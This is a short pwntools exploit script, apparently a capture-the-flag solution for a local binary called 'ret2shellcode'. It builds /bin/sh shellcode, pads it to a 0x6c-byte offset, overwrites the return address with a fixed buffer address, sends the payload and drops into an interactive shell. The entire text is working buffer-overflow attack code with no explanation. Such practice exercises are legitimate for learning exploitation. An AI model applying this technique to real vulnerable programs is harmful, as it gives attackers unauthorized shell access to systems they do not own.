from pwn import *
sh = process("./ret2shellcode")
offset = 0x6c
add = 0x0804A080
shellcode = asm(shellcraft.sh())
payload = shellcode + b"a"*(offset - len(shellcode)) + b"b"*0x4 + p32(add)
sh.sendline(payload)
sh.interactive()
